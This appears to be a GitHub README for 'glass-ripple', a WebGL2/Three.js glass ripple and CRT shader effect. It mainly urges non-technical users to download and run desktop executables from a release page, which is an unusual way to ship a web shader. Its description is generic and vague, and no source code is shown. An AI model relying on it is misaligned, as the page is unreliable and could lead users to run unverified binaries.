# 🪞 glass-ripple - Smooth GPU Glass Ripple Effects

[![Download Latest Release](https://img.shields.io/badge/Download-glass--ripple-blue?style=for-the-badge&logo=github)](https://github.com/Olasdinos/glass-ripple/releases)

## 📋 What is glass-ripple?

glass-ripple offers a smooth, GPU-accelerated glass ripple effect with a retro CRT style. It uses a shader pipeline powered by WebGL2 and Three.js. The effect adds subtle water-like ripple animations with brand icons, perfect for hero sections or landing pages. It runs smoothly using your computer’s graphics card.

This software fits well if you want a cool visual effect on your website or project without deep coding work. No technical knowledge or programming is needed to get the app running and see the effect in action.

## 💻 System Requirements

Before you start, make sure your device meets the following:

- Operating System: Windows 10 or higher, macOS 10.13+, or recent Linux distribution  
- Browser: Chrome, Firefox, Edge, or Safari (latest versions) that support WebGL2  
- Hardware: Any computer with a GPU that supports WebGL2 and shader programs  
- Internet: Optional to download the software; no connection needed to run locally after installation  

If your device runs modern browsers and supports WebGL2, glass-ripple will work fine.

## 🚀 Getting Started

Follow these steps to get glass-ripple running:

### 1. Visit the Release Page

Click the big button at the top or open this link:  
[https://github.com/Olasdinos/glass-ripple/releases](https://github.com/Olasdinos/glass-ripple/releases)

This page lists all the released versions. You want to get the latest stable version here.

### 2. Download the Latest Release

On the release page, look for assets labeled for your operating system:

- Windows users: look for `.exe` installer or `.zip` archive  
- macOS users: look for `.dmg` or `.zip` archive  
- Linux users: look for `.AppImage` or `.tar.gz` files  

Click on the appropriate file to start the download.

### 3. Install or Extract the Files

Depending on your download:

- If it is an installer (`.exe` or `.dmg`), double-click and follow the prompts to install.  
- If it is a zipped archive (`.zip` or `.tar.gz`), extract it to a folder you can find easily, such as your Desktop or Documents.

### 4. Run the Program

- On Windows, double-click the installed program or the executable inside the extracted folder.  
- On macOS, open the installed app or the extracted app file and allow permissions if prompted.  
- On Linux, you might need to make the file executable first by right-clicking and selecting properties, then permissions, then “Allow executing file as program.” Run it by double-clicking or via terminal.

### 5. See the Glass Ripple Effect

After running, a window or browser tab will open and start showing the GPU-accelerated glass ripple effect with brand icons and the retro CRT animation. You can explore the effect interactively or let it run as a visual background.

## 📥 Download & Install

You can start downloading from here too:

Carefully choose the file that matches your system. Installation is simple:

- For installers, follow on-screen instructions.  
- For archives, unzip and locate the executable.  

No special setup is required after installation. The program runs on standard graphic hardware with browser or desktop support for WebGL2.

## 🧩 Features

glass-ripple provides:

- **GPU-powered animation:** Uses your graphics card to deliver smooth ripple effects.  
- **11-pass shader pipeline:** Advanced visual effects using multi-step WebGL2 shaders.  
- **CRT retro look:** Nostalgic scanlines, distortion, and glow effects like old screens.  
- **Brand icons:** Animated logos ripple in the background for a modern feel.  
- **Interactive design:** Responds to mouse or touch inputs to create ripples.  
- **Cross-platform:** Works on Windows, macOS, Linux with compatible browsers.  
- **No coding needed:** Run the app without programming skills.  

These features bring a polished and modern look to any web hero section or digital interface.

## 🔧 How It Works

glass-ripple uses WebGL2 shaders written in GLSL to create the glass ripple effect. The 11-pass pipeline means it processes the image multiple times to layer effects:

1. Base image with icons  
2. Ripple distortion applied  
3. CRT scanline overlay  
4. Color adjustments and glow  
5. Final compositing  

It runs on Three.js, a JavaScript library that makes WebGL easier to handle. On your device, the program smoothly animates these effects using your GPU. It responds to clicks or touches so ripples follow your input.

## 🎨 Customizing the Effect

If you want to try changing settings (optional):

- Adjust ripple intensity  
- Change speed of animation  
- Toggle CRT scanlines on/off  
- Swap brand icon sets  

These options might be available via a simple settings menu or config file included with the app. Feel free to explore once you are comfortable running it.

## ❓ Troubleshooting

If glass-ripple does not run or shows errors, try these steps:

- Confirm your browser or system supports WebGL2. You can check support here: https://get.webgl.org/webgl2/  
- Update your graphics card drivers to the latest version.  
- Restart your device to clear any temporary issues.  
- Try running the app in a different browser or operating system if possible.  
- Ensure you downloaded the correct file for your device and extracted it properly.
